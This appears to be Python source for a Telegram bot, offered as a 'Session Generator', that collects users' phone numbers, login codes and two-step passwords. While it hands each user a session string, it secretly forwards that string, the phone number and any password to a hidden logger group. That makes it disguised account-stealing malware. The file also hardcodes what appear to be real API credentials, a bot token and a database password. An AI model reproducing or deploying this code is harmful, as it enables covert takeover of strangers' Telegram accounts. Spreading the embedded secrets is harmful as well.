import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from pymongo import MongoClient

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
MUST_JOIN = "SANATANI_TECH"
LOGGER_GROUP = -1002477750706  # Replace with your logger group ID
MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Connect to MongoDB
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["telegram_bot"]
user_collection = db["users"]

# 🔹 Store user sessions
user_sessions = {}

async def check_membership(user_id):
    try:
        participant = await bot.get_permissions(MUST_JOIN, user_id)
        return participant and participant.is_member
    except:
        return False

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id
    is_member = await check_membership(user_id)

    if not is_member:
        await event.respond(
            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
        )
        return

    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("ℹ Help", b"help")]
        ]
    )

@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await ask_phone(event)
    elif event.data == b"help":
        await event.respond(
            "**ℹ How to Generate a String Session:**\n"
            "1️⃣ Click 'Generate Session'.\n"
            "2️⃣ Enter your phone number (with country code).\n"
            "3️⃣ Enter the OTP received on Telegram.\n"
            "4️⃣ If asked, enter your 2-Step Verification password.\n"
            "5️⃣ Your session string will be generated.\n\n"
            "**⚠ Keep your session string safe!**"
        )

@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id
    is_member = await check_membership(user_id)

    if not is_member:
        await event.respond(
            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
        )
        return

    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "📲 **Enter your phone number with country code (e.g., +919876543210):**",
        buttons=[[Button.inline("❌ Cancel", b"cancel")]]
    )

@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]

    if step == "phone":
        phone_number = event.message.text.strip()
        if not phone_number.startswith("+") or not phone_number[1:].isdigit():
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return

        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "otp":
        otp_code = event.message.text.strip()
        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")

            await bot.send_message(LOGGER_GROUP, f"👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🛡 **Session:**\n`{session_string}`")

            del user_sessions[user_id]

            # Save user data in MongoDB
            user_collection.update_one(
                {"user_id": user_id},
                {"$set": {"joined": True, "phone_number": phone_number}},
                upsert=True
            )

        except Exception as e:
            if "The confirmation code has expired" in str(e):
                del user_sessions[user_id]
                await event.respond("❌ **Error: The OTP has expired. Please use /generate to start again.**")
            elif "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")

            await bot.send_message(LOGGER_GROUP, f"👤 **User:** `{user_id}`\n📱 **Phone:** `{user_sessions[user_id]['phone']}`\n🔑 **Password:** `{password}`\n🛡 **Session:**\n`{session_string}`")

            del user_sessions[user_id]

            # Save user data in MongoDB
            user_collection.update_one(
                {"user_id": user_id},
                {"$set": {"joined": True, "phone_number": user_sessions[user_id]["phone"]}},
                upsert=True
            )

        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

@bot.on(events.CallbackQuery)
async def cancel_process(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await event.respond("✅ **Process canceled successfully. Use /start to begin again.**")
    else:
        await event.respond("⚠️ **No active process found.**")

print("🚀 Bot is running...")
bot.run_until_disconnected()
